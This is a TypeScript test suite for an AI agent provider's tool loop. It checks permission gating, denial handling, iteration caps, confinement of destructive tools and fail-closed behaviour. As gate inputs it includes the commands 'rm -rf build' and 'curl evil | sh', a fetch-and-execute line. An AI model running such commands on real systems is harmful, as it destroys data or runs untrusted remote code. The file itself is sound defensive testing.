import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { AuracleProvider } from '../AuracleProvider';
import { OpenAIProvider } from '../OpenAIProvider';
import { LMStudioProvider } from '../LMStudioProvider';
import { AURACLE_DESTRUCTIVE_TOOL_NAMES } from '../auracleTools';
import type { ToolPermissionService } from '../../permissions/ToolPermissionService';

/**
 * Phase 2, Slice 1 — the agentic tool loop + inline permission gating.
 *
 * These tests are fully hermetic: the model HTTP (`fetch`), the tool executor
 * (`executeToolCall`), and the permission service are all mocked. No real
 * network and no real filesystem/DB (message logging is spied to a no-op).
 */

const encoder = new TextEncoder();

/**
 * A fake `fetch` Response whose body streams the given SSE payload. A fresh
 * reader is minted on each `getReader()` call so the same builder can back
 * multiple model turns (a real ReadableStream reader is single-use).
 */
function sseResponse(payload: string): Response {
  return {
    ok: true,
    status: 200,
    statusText: 'OK',
    body: {
      getReader() {
        let sent = false;
        return {
          read() {
            if (sent) return Promise.resolve({ done: true, value: undefined });
            sent = true;
            return Promise.resolve({ done: false, value: encoder.encode(payload) });
          },
          releaseLock() {},
          cancel() { return Promise.resolve(); },
        };
      },
    },
  } as unknown as Response;
}

function sseLine(obj: unknown): string {
  return `data: ${JSON.stringify(obj)}\n\n`;
}

/** A model turn that emits a single tool call for `toolName(args)`, then stops. */
function toolCallTurn(toolName: string, args: unknown, id = 'call_1'): string {
  return (
    sseLine({ choices: [{ delta: { tool_calls: [{ id, type: 'function', function: { name: toolName, arguments: '' } }] } }] }) +
    sseLine({ choices: [{ delta: { tool_calls: [{ function: { arguments: JSON.stringify(args) } }] } }] }) +
    sseLine({ choices: [{ delta: {}, finish_reason: 'tool_calls' }] }) +
    'data: [DONE]\n\n'
  );
}

/** A model turn that emits a plain text answer and stops. */
function textTurn(text: string): string {
  return (
    sseLine({ choices: [{ delta: { content: text } }] }) +
    sseLine({ choices: [{ delta: {}, finish_reason: 'stop' }] }) +
    'data: [DONE]\n\n'
  );
}

async function drain(iter: AsyncIterableIterator<StreamChunkLike>): Promise<StreamChunkLike[]> {
  const out: StreamChunkLike[] = [];
  for await (const chunk of iter) out.push(chunk);
  return out;
}

type StreamChunkLike = {
  type: string;
  content?: string;
  isComplete?: boolean;
  toolCall?: { id?: string; name?: string; arguments?: unknown; result?: any };
  toolError?: { name?: string };
  error?: string;
};

/** Build a provider with an injected (mock) permission service + silenced logging. */
function makeProvider(requestToolPermission: ReturnType<typeof vi.fn>): AuracleProvider {
  const permissionService = { requestToolPermission } as unknown as ToolPermissionService;
  const provider = new AuracleProvider({ permissionService });
  // Keep tests off the DB — message/error logging is fire-and-forget in prod.
  vi.spyOn(provider as unknown as { logAgentMessage: (...a: unknown[]) => Promise<void> }, 'logAgentMessage')
    .mockResolvedValue(undefined);
  vi.spyOn(provider as unknown as { logError: (...a: unknown[]) => void }, 'logError')
    .mockImplementation(() => {});
  return provider;
}

const WS = '/tmp/workspace';
const SID = 'sess-1';

describe('AuracleProvider agentic tool loop', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it('runs a multi-step loop: executes a tool, feeds the result back, RE-INVOKES the model, then answers', async () => {
    const requestToolPermission = vi.fn().mockResolvedValue({ decision: 'allow', scope: 'once' });
    const provider = makeProvider(requestToolPermission);
    const execSpy = vi
      .spyOn(provider as unknown as { executeToolCall: (n: string, a: unknown) => Promise<unknown> }, 'executeToolCall')
      .mockResolvedValue({ success: true, output: 'file contents' });

    const fetchMock = vi.fn()
      .mockResolvedValueOnce(sseResponse(toolCallTurn('readFile', { path: 'a.md' })))
      .mockResolvedValueOnce(sseResponse(textTurn('Here is the answer.')));
    vi.stubGlobal('fetch', fetchMock);

    const chunks = await drain(
      provider.sendMessage('read a.md', undefined, SID, [], WS) as AsyncIterableIterator<StreamChunkLike>
    );

    // The model was re-invoked exactly once after the tool result → 2 model calls.
    expect(fetchMock).toHaveBeenCalledTimes(2);

    // The tool ran once, with the parsed args.
    expect(execSpy).toHaveBeenCalledTimes(1);
    expect(execSpy).toHaveBeenCalledWith('readFile', { path: 'a.md' });

    // The SECOND model call carried the appended conversation: an assistant
    // message with tool_calls, followed by a role:'tool' result.
    const secondBody = JSON.parse((fetchMock.mock.calls[1][1] as { body: string }).body);
    const toolMsgs = secondBody.messages.filter((m: { role: string }) => m.role === 'tool');
    expect(toolMsgs).toHaveLength(1);
    expect(toolMsgs[0].tool_call_id).toBe('call_1');
    expect(
      secondBody.messages.some(
        (m: { role: string; tool_calls?: unknown[] }) => m.role === 'assistant' && Array.isArray(m.tool_calls)
      )
    ).toBe(true);

    // Terminated with the final answer.
    const complete = chunks.find(c => c.type === 'complete');
    expect(complete).toBeTruthy();
    expect(complete?.content).toBe('Here is the answer.');
    const streamedText = chunks.filter(c => c.type === 'text').map(c => c.content).join('');
    expect(streamedText).toBe('Here is the answer.');

    // A tool_call chunk was surfaced to the UI with the execution result.
    const toolChunk = chunks.find(c => c.type === 'tool_call' && c.toolCall?.name === 'readFile');
    expect(toolChunk?.toolCall?.result).toEqual({ success: true, output: 'file contents' });
  });

  it('requests permission BEFORE executing each tool call', async () => {
    const order: string[] = [];
    const requestToolPermission = vi.fn().mockImplementation(async () => {
      order.push('permission');
      return { decision: 'allow', scope: 'once' };
    });
    const provider = makeProvider(requestToolPermission);
    vi.spyOn(
      provider as unknown as { executeToolCall: (n: string, a: unknown) => Promise<unknown> },
      'executeToolCall'
    ).mockImplementation(async () => {
      order.push('execute');
      return { ok: true };
    });

    const fetchMock = vi.fn()
      .mockResolvedValueOnce(sseResponse(toolCallTurn('searchFiles', { query: 'x' })))
      .mockResolvedValueOnce(sseResponse(textTurn('done')));
    vi.stubGlobal('fetch', fetchMock);

    await drain(provider.sendMessage('go', undefined, SID, [], WS) as AsyncIterableIterator<StreamChunkLike>);

    expect(requestToolPermission).toHaveBeenCalledTimes(1);
    // Strict ordering: permission is granted, THEN the tool executes.
    expect(order).toEqual(['permission', 'execute']);
    expect(requestToolPermission.mock.calls[0][0]).toMatchObject({
      toolName: 'searchFiles',
      sessionId: SID,
      workspacePath: WS,
    });
  });

  it('does NOT execute a denied tool call and feeds a denial result back to the model', async () => {
    const requestToolPermission = vi.fn().mockResolvedValue({ decision: 'deny', scope: 'once' });
    const provider = makeProvider(requestToolPermission);
    const execSpy = vi
      .spyOn(provider as unknown as { executeToolCall: (n: string, a: unknown) => Promise<unknown> }, 'executeToolCall')
      .mockResolvedValue({ ok: true });

    const fetchMock = vi.fn()
      .mockResolvedValueOnce(sseResponse(toolCallTurn('readFile', { path: 'secret' })))
      .mockResolvedValueOnce(sseResponse(textTurn('ok, skipped that')));
    vi.stubGlobal('fetch', fetchMock);

    const chunks = await drain(
      provider.sendMessage('read secret', undefined, SID, [], WS) as AsyncIterableIterator<StreamChunkLike>
    );

    // The tool never ran.
    expect(execSpy).not.toHaveBeenCalled();

    // A denial tool result was fed back on the re-invocation so the model reacts.
    expect(fetchMock).toHaveBeenCalledTimes(2);
    const secondBody = JSON.parse((fetchMock.mock.calls[1][1] as { body: string }).body);
    const toolMsg = secondBody.messages.find((m: { role: string }) => m.role === 'tool');
    expect(toolMsg).toBeTruthy();
    expect(String(toolMsg.content).toLowerCase()).toContain('denied');

    // The loop still terminates cleanly.
    const complete = chunks.find(c => c.type === 'complete');
    expect(complete?.content).toBe('ok, skipped that');

    // The tool_call chunk surfaced the denied outcome.
    const toolChunk = chunks.find(c => c.type === 'tool_call' && c.toolCall?.name === 'readFile');
    expect(toolChunk?.toolCall?.result?.denied).toBe(true);
  });

  it('stops at the hard iteration cap when the model keeps calling tools, and ends cleanly', async () => {
    const requestToolPermission = vi.fn().mockResolvedValue({ decision: 'allow', scope: 'once' });
    const provider = makeProvider(requestToolPermission);
    const execSpy = vi
      .spyOn(provider as unknown as { executeToolCall: (n: string, a: unknown) => Promise<unknown> }, 'executeToolCall')
      .mockResolvedValue({ ok: true });

    // EVERY model turn asks for another tool → the loop must self-terminate.
    // A fresh response (fresh reader) is minted per call.
    const fetchMock = vi.fn().mockImplementation(() =>
      Promise.resolve(sseResponse(toolCallTurn('readFile', { n: 1 })))
    );
    vi.stubGlobal('fetch', fetchMock);

    const chunks = await drain(
      provider.sendMessage('loop forever', undefined, SID, [], WS) as AsyncIterableIterator<StreamChunkLike>
    );

    // Model called exactly MAX_TOOL_ITERATIONS times — never more.
    expect(fetchMock).toHaveBeenCalledTimes(AuracleProvider.MAX_TOOL_ITERATIONS);
    expect(fetchMock.mock.calls.length).toBeLessThanOrEqual(AuracleProvider.MAX_TOOL_ITERATIONS);
    expect(execSpy).toHaveBeenCalledTimes(AuracleProvider.MAX_TOOL_ITERATIONS);

    // Ended with a proper completion (not hung, not thrown).
    const complete = chunks.find(c => c.type === 'complete');
    expect(complete?.isComplete).toBe(true);
    expect(String(complete?.content)).toContain('maximum');
    // No error chunk was emitted.
    expect(chunks.some(c => c.type === 'error')).toBe(false);
  });
});

/**
 * Phase 2, Slice 2 — the "missing link" that makes the ToolPermissionWidget
 * render for auracle. The widget renders from a logged `nimbalyst_tool_use`
 * /`ToolPermission` agent message (projected into the canonical transcript), NOT
 * from the `toolPermission:pending` event. `logToolPermissionWidget` builds that
 * message from the pending payload the ToolPermissionService emits.
 */
describe('AuracleProvider ToolPermissionWidget logging (Slice 2 missing-link)', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  function pendingPayload(overrides: Record<string, unknown> = {}) {
    return {
      requestId: 'tool-sess-1-abc',
      sessionId: SID,
      workspacePath: WS,
      request: {
        id: 'tool-sess-1-abc',
        toolName: 'readFile',
        rawCommand: 'read a.md',
        actionsNeedingApproval: [{ action: { pattern: 'readFile' }, warnings: ['careful'] }],
        hasDestructiveActions: false,
        createdAt: Date.now(),
      },
      ...overrides,
    };
  }

  it('logs a nimbalyst_tool_use/ToolPermission agent message the widget can render', () => {
    const provider = new AuracleProvider();
    const logSpy = vi
      .spyOn(provider as unknown as { logAgentMessage: (...a: unknown[]) => Promise<void> }, 'logAgentMessage')
      .mockResolvedValue(undefined);

    (provider as unknown as { logToolPermissionWidget: (d: unknown) => void }).logToolPermissionWidget(pendingPayload());

    expect(logSpy).toHaveBeenCalledTimes(1);
    const [sessionId, source, direction, content] = logSpy.mock.calls[0] as [string, string, string, string];
    expect(sessionId).toBe(SID);
    expect(source).toBe('auracle');
    expect(direction).toBe('output');

    const parsed = JSON.parse(content);
    expect(parsed.type).toBe('nimbalyst_tool_use');
    expect(parsed.name).toBe('ToolPermission');
    expect(parsed.id).toBe('tool-sess-1-abc');
    expect(parsed.input).toMatchObject({
      requestId: 'tool-sess-1-abc',
      toolName: 'readFile',
      pattern: 'readFile',
      isDestructive: false,
      warnings: ['careful'],
      workspacePath: WS,
    });
    // The widget reads patternDisplayName; it must be present (derived from pattern).
    expect(typeof parsed.input.patternDisplayName).toBe('string');
  });

  it('is a no-op when the pending payload lacks a session / request / requestId', () => {
    const provider = new AuracleProvider();
    const logSpy = vi
      .spyOn(provider as unknown as { logAgentMessage: (...a: unknown[]) => Promise<void> }, 'logAgentMessage')
      .mockResolvedValue(undefined);

    const log = (provider as unknown as { logToolPermissionWidget: (d: unknown) => void }).logToolPermissionWidget.bind(provider);
    log(pendingPayload({ sessionId: undefined }));
    log(pendingPayload({ request: undefined }));
    log(pendingPayload({ requestId: undefined }));
    log(undefined);

    expect(logSpy).not.toHaveBeenCalled();
  });
});

/**
 * Phase 2, Slice 3 — the SAFETY-CRITICAL slice.
 *
 * CONTAINMENT: the destructive tools (writeFile/editFile/bash) must be OFFERED
 * ONLY by auracle. openai/lmstudio inherit the base getToolsInOpenAIFormat()
 * which reads only the shared registry, so they must NOT see them.
 */
describe('AuracleProvider destructive-tool containment (Slice 3)', () => {
  const offeredToolNames = (provider: unknown): string[] =>
    ((provider as { getToolsInOpenAIFormat: () => Array<{ function: { name: string } }> })
      .getToolsInOpenAIFormat())
      .map(t => t.function.name);

  it('auracle OFFERS writeFile / editFile / bash on top of the shared read-only tools', () => {
    const names = offeredToolNames(new AuracleProvider());
    for (const t of AURACLE_DESTRUCTIVE_TOOL_NAMES) {
      expect(names).toContain(t);
    }
    // Shared read-only tools are still offered.
    expect(names).toContain('readFile');
    expect(names).toContain('searchFiles');
  });

  it('openai and lmstudio do NOT offer writeFile / editFile / bash', () => {
    for (const provider of [new OpenAIProvider(), new LMStudioProvider()]) {
      const names = offeredToolNames(provider);
      for (const t of AURACLE_DESTRUCTIVE_TOOL_NAMES) {
        expect(names).not.toContain(t);
      }
    }
  });

  it('the destructive tools are absent from the shared toolset both providers share', () => {
    const openaiNames = offeredToolNames(new OpenAIProvider());
    const lmstudioNames = offeredToolNames(new LMStudioProvider());
    // openai and lmstudio see the SAME shared toolset (neither adds the tools).
    expect(new Set(openaiNames)).toEqual(new Set(lmstudioNames));
  });
});

/**
 * FAIL-CLOSED: with no trust infrastructure to gate on, a DESTRUCTIVE tool must
 * be DENIED, while a READ-ONLY tool keeps the permissive fallback. With infra
 * present, destructive tools go through the gate (canonicalized), and compound
 * bash commands are split and gated per sub-command.
 */
describe('AuracleProvider fail-closed permission gate (Slice 3)', () => {
  const signal = () => new AbortController().signal;

  // Directly exercise the private gate. Casting keeps the test at the seam that
  // sendMessage calls for every tool.
  const gate = (
    provider: AuracleProvider,
    name: string,
    input: unknown,
    workspacePath: string | undefined,
  ) =>
    (provider as unknown as {
      requestToolPermissionForCall: (
        n: string, i: unknown, s: string | undefined, w: string | undefined, p: string | undefined, sig: AbortSignal
      ) => Promise<{ decision: string }>;
    }).requestToolPermissionForCall(name, input, SID, workspacePath, workspacePath, signal());

  it('DENIES a destructive tool when no service/session/workspace is available', async () => {
    const requestToolPermission = vi.fn();
    const provider = makeProvider(requestToolPermission);
    // workspacePath omitted → the "no infra" branch.
    const decision = await gate(provider, 'writeFile', { path: 'a.ts', content: 'x' }, undefined);
    expect(decision.decision).toBe('deny');
    // Never reached the gate.
    expect(requestToolPermission).not.toHaveBeenCalled();
  });

  it('ALLOWS a read-only tool under the same no-infra condition', async () => {
    const requestToolPermission = vi.fn();
    const provider = makeProvider(requestToolPermission);
    const decision = await gate(provider, 'readFile', { path: 'a.ts' }, undefined);
    expect(decision.decision).toBe('allow');
    expect(requestToolPermission).not.toHaveBeenCalled();
  });

  it('routes a destructive tool THROUGH the gate (canonicalized) when infra is present', async () => {
    const requestToolPermission = vi.fn().mockResolvedValue({ decision: 'allow', scope: 'once' });
    const provider = makeProvider(requestToolPermission);
    const decision = await gate(provider, 'writeFile', { path: 'a.ts', content: 'x' }, WS);
    expect(decision.decision).toBe('allow');
    expect(requestToolPermission).toHaveBeenCalledTimes(1);
    expect(requestToolPermission.mock.calls[0][0]).toMatchObject({
      toolName: 'Write',      // writeFile canonicalizes to Write for gating metadata
      isDestructive: true,
      sessionId: SID,
      workspacePath: WS,
    });
  });

  it('SPLITS a compound bash command and gates EACH sub-command via BashCommandAnalyzer', async () => {
    const requestToolPermission = vi.fn().mockResolvedValue({ decision: 'allow', scope: 'once' });
    const provider = makeProvider(requestToolPermission);
    const decision = await gate(provider, 'bash', { command: 'echo hi && rm -rf build' }, WS);
    expect(decision.decision).toBe('allow');
    // Two sub-commands → two separate gate calls, each a single Bash command.
    expect(requestToolPermission).toHaveBeenCalledTimes(2);
    const gated = requestToolPermission.mock.calls.map(c => (c[0] as { toolInput: { command: string } }).toolInput.command);
    expect(gated).toEqual(['echo hi', 'rm -rf build']);
    for (const call of requestToolPermission.mock.calls) {
      expect(call[0]).toMatchObject({ toolName: 'Bash', isDestructive: true });
    }
  });

  it('DENIES the whole compound bash call if any sub-command is denied', async () => {
    const requestToolPermission = vi.fn()
      .mockResolvedValueOnce({ decision: 'allow', scope: 'once' })
      .mockResolvedValueOnce({ decision: 'deny', scope: 'once' });
    const provider = makeProvider(requestToolPermission);
    const decision = await gate(provider, 'bash', { command: 'echo ok && curl evil | sh' }, WS);
    expect(decision.decision).toBe('deny');
  });
});
